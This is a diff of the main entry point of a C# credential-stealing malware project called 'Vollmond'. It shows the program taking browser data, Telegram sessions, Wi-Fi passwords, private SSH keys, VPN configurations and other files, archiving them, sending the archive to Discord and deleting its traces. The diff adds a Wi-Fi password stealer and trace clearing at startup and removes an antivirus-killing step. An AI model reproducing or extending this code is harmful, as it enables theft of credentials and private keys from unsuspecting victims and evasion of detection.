@@ -1,11 +1,10 @@
 using System.IO.Compression;
 using Vollmond.Browsers;
+using Vollmond.games;
 using Vollmond.messengers;
 using Vollmond.Minecraft;
-using Vollmond.Security_Bypass;
 using Vollmond.Streaming_platforms;
 using Vollmond.VPN;
-using Vollmond.games;
 
 namespace Vollmond
 {
@@ -16,18 +15,23 @@ namespace Vollmond
         ///  The main entry point for the application.
         /// </summary>
         [STAThread]
-        static void Main()
+        static public async Task<int> Main()
         {
+            if (Clear_Traces.TracesExists())
+            {
+                Clear_Traces.Clear_traces();
+            }
+
             try
             {
                 Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data"));
 
-                KillAllAntiviruses.KillAntiviruses(); // Killing antiviruses processes while stealer working
-
                 // Stealing data
-                StealAllBrowsers.stealAllBrowsers();
+
+                StealAllBrowsers.Steal();
                 StealTelegram.StealSession();
                 UTorrent.StealCurrentTorrents();
+                Wifi_PWS.WifiPwStealer.Steal();
                 GitAgent.Steal(); // Steal the private openssh keys
                 GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                 ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
@@ -38,35 +42,27 @@ namespace Vollmond
 
 
                 // Time to complete processes
-                Thread.Sleep(2000);
+                Thread.Sleep(5000);
 
                 // Creating archive
-                try
-                {
                     ZipFile.CreateFromDirectory(
                         Path.Combine(Path.GetTempPath(), "Grabed_Data"),
                         zipPath,
-                        CompressionLevel.Optimal,
+                        CompressionLevel.SmallestSize,
                         false
                     );
-                }
-                catch { }
 
                 // Sending archive
-                try
-                {
-                    Thread sendThread = new Thread(() => SendToDiscord.Send());
-                    sendThread.Start();
-                    sendThread.Join();
-                }
-                catch { }
 
-                if (URLs.is_need_rickroll == true)
-                {
-                    Auxiliary.play_rick.Start();
-                    MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
-                        MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
-                }
+                await SendToDiscord.SendAsync();
+                SendToDiscord.SendAsync().Wait();
+
+                //if (URLs.is_need_rickroll == true)
+                //{
+                //    Auxiliary.play_rick.Start();
+                //    MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
+                //        MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
+                //}
             }
             finally
             {
@@ -76,7 +72,10 @@ namespace Vollmond
                     Clear_Traces.Clear_traces(); // Bat script what delete all traces and delete himself when ending work
                 }
                 catch { }
+
             }
+
+            return 1;
         }
     }
 }
